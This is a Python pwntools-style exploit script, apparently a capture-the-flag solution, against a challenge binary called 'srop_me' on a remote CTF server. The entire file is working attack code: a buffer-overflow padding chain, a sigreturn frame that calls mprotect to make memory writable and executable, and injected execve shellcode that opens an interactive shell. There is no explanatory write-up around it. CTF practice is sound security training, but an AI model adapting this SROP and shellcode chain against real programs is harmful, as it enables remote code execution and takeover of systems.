#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./srop_me")
host = args.HOST or "challs.n00bzunit3d.xyz"
port = int(args.PORT or 38894)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

padding = b"A" * 32
call_read_sub_rsp = 0x40101F
syscall_ret_addr = 0x401047
fake_rwx_addr = 0x401540
rwx_addr = 0x401000
shellcode_addr = fake_rwx_addr - 0x20

rop1 = padding
rop1 += p(call_read_sub_rsp)
rop1 += padding
rop1 += p(syscall_ret_addr)


"""
Name            : mprotect
rax             : 0x0a
rdi             : unsigned long start
rsi             : size_t len
rdx             : unsigned long prot
rcx             : -
r8              : -
r9              : -
Definition      : mm/mprotect.c
"""

mprotect_frame = SigreturnFrame()
mprotect_frame.rip = 0x401019  # Do syscall and continue the program by reading our input to shellcode_addr
mprotect_frame.rsp = fake_rwx_addr
mprotect_frame.rax = 0xA
mprotect_frame.rdi = 0x401000
mprotect_frame.rsi = 0x1000
mprotect_frame.rdx = 7

s(rop1 + bytes(mprotect_frame))

pause()

s(b"A" * 15)

pause()

s(
    asm(execve_x64) + p(shellcode_addr)
)  # shellcode length = 32 bytes. so equal to the padding length

io.interactive()
